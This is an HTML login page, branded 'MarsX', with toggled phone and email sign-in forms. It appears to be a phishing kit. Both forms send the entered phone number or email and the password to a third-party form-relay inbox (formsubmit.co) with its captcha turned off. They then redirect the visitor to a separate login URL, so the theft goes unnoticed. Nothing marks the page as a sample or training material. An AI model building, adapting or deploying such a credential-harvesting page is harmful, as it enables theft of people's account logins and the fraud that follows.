<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login Page</title>
  <style>
    body {
      background-color: #000;
      font-family: Arial, sans-serif;
      color: white;
      margin: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding-top: 50px;
    }

    .page-title {
      color: white;
      font-size: 14px;
      font-weight: normal;
      text-align: center;
      width: 100%;
      margin-bottom: 10px;
      margin-top: -30px;
    }

    .top-right-image {
      position: absolute;
      top: 10px;
      right: 20px;
      width: auto;
    }

    .container {
      width: 400px;
      display: flex;
      flex-direction: column;
      align-items: flex-start;
    }

    .logo {
      width: 100px;
      margin-bottom: 10px;
    }

    .welcome {
      font-size: 26px;
      font-weight: bold;
      margin-bottom: 25px;
    }

    .toggle-container {
      display: flex;
      background-color: #2d2d2d;
      border-radius: 999px;
      overflow: hidden;
      margin-bottom: 25px;
      width: 100%;
      height: 38px;
      padding: 3px;
    }

    .toggle-button {
      flex: 1;
      padding: 5px 0;
      text-align: center;
      cursor: pointer;
      background-color: transparent;
      color: white;
      border: none;
      font-weight: 600;
      font-size: 0.95rem;
      transition: background-color 0.3s ease, color 0.3s ease;
      border-radius: 999px;
    }

    .toggle-button.active {
      background-color: #d4af37;
      color: white;
    }

    form {
      display: flex;
      flex-direction: column;
      width: 100%;
      gap: 14px;
    }

    label {
      font-size: 0.9rem;
      margin-left: 12px;
      margin-bottom: -10px;
    }

    .input-group {
      background-color: #2d2d2d;
      border-radius: 30px;
      display: flex;
      align-items: center;
      padding: 12px 16px;
      gap: 10px;
    }

    .input-group img.flag {
      width: 20px;
      height: 20px;
      border-radius: 50%;
      object-fit: cover;
    }

    .input-group select, .input-group input {
      background: none;
      border: none;
      color: white;
      font-size: 1rem;
      outline: none;
    }

    .input-group select {
      width: 60px;
    }

    .input-group input {
      flex: 1;
    }

    .input-group input::placeholder {
      color: rgba(255, 255, 255, 0.5);
    }

    .eye-icon {
      cursor: pointer;
      width: 16px;
      height: 16px;
      opacity: 0.6;
    }

    .forgot-remember {
      display: flex;
      flex-direction: column;
      gap: 10px;
      margin-bottom: 10px;
      font-size: 0.85rem;
    }

    .forgot-link {
      color: white;
      text-decoration: none;
    }

    .remember-checkbox {
      display: flex;
      align-items: center;
      cursor: pointer;
      user-select: none;
    }

    .remember-checkbox input {
      display: none;
    }

    .remember-checkbox .checkmark {
      width: 18px;
      height: 18px;
      border: 2px solid white;
      border-radius: 4px;
      margin-right: 8px;
      background-color: transparent;
      position: relative;
    }

    .remember-checkbox input:checked + .checkmark {
      background-color: #d4af37; /* jaune */
      border-color: #d4af37;
    }

    .remember-checkbox input:checked + .checkmark::after {
      content: "";
      position: absolute;
      left: 4px;
      top: 0px;
      width: 6px;
      height: 12px;
      border: solid white;
      border-width: 0 2px 2px 0;
      transform: rotate(45deg);
    }

    button[type="submit"] {
      background-color: #d4af37;
      border: none;
      padding: 12px;
      border-radius: 30px;
      font-weight: bold;
      color: white;
      cursor: pointer;
    }

    .disclaimer {
      font-size: 0.85rem;
      color: white;
      text-align: center;
      margin-top: 10px;
    }

    .disclaimer span {
      color: #d4af37;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <img src="lkl.png" alt="Corner Icon" class="top-right-image">
  <div class="page-title">Log In</div>

  <div class="container">
    <img src="immmm.png" alt="MarsX Logo" class="logo" />
    <div class="welcome">Welcome To Login</div>

    <div class="toggle-container">
      <button class="toggle-button active" onclick="toggleLogin('phone')">Phone Login</button>
      <button class="toggle-button" onclick="toggleLogin('email')">Email Login</button>
    </div>

    <!-- PHONE LOGIN FORM -->
    <form id="phoneForm" action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST">
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="https://masx45.com/login?lang=en">

      <label for="phone">Phone Number</label>
      <div class="input-group">
        <img class="flag" src="https://flagcdn.com/us.svg" alt="US Flag">
        <select name="countryCode">
          <option value="+1">+1</option>
          <option value="+33">+33</option>
          <option value="+44">+44</option>
        </select>
        <input type="text" name="phone" placeholder="Phone number" required>
      </div>

      <label for="password">Password</label>
      <div class="input-group">
        <input type="password" name="password" placeholder="Password" required>
        <img class="eye-icon" src="https://img.icons8.com/ios-glyphs/30/ffffff/invisible.png" onclick="togglePassword(this)">
      </div>

      <div class="forgot-remember">
        <a href="#" class="forgot-link">Forgot password?</a>
        <label class="remember-checkbox">
          <input type="checkbox">
          <span class="checkmark"></span>
          Remember account and password
        </label>
      </div>

      <button type="submit">Login</button>
      <p class="disclaimer">Continue Is Agree <span>Sign Up</span></p>
    </form>

    <!-- EMAIL LOGIN FORM -->
    <form id="emailForm" action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST" style="display: none;">
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="https://masx45.com/login?lang=en">

      <label for="email">Email Address</label>
      <div class="input-group">
        <input type="email" name="email" placeholder="Email address" required>
      </div>

      <label for="password">Password</label>
      <div class="input-group">
        <input type="password" name="password" placeholder="Password" required>
        <img class="eye-icon" src="https://img.icons8.com/ios-glyphs/30/ffffff/invisible.png" onclick="togglePassword(this)">
      </div>

      <div class="forgot-remember">
        <a href="#" class="forgot-link">Forgot password?</a>
        <label class="remember-checkbox">
          <input type="checkbox">
          <span class="checkmark"></span>
          Remember account and password
        </label>
      </div>

      <button type="submit">Login</button>
      <p class="disclaimer">Continue Is Agree <span>Sign Up</span></p>
    </form>
  </div>

  <script>
    function togglePassword(icon) {
      const input = icon.previousElementSibling;
      const isHidden = input.type === 'password';
      input.type = isHidden ? 'text' : 'password';
      icon.src = isHidden
        ? 'https://img.icons8.com/ios-glyphs/30/ffffff/visible--v1.png'
        : 'https://img.icons8.com/ios-glyphs/30/ffffff/invisible.png';
    }

    function toggleLogin(method) {
      const phoneBtn = document.querySelector('.toggle-button:nth-child(1)');
      const emailBtn = document.querySelector('.toggle-button:nth-child(2)');
      const phoneForm = document.getElementById('phoneForm');
      const emailForm = document.getElementById('emailForm');

      if (method === 'phone') {
        phoneBtn.classList.add('active');
        emailBtn.classList.remove('active');
        phoneForm.style.display = 'flex';
        emailForm.style.display = 'none';
      } else {
        emailBtn.classList.add('active');
        phoneBtn.classList.remove('active');
        emailForm.style.display = 'flex';
        phoneForm.style.display = 'none';
      }
    }
  </script>
</body>
</html>
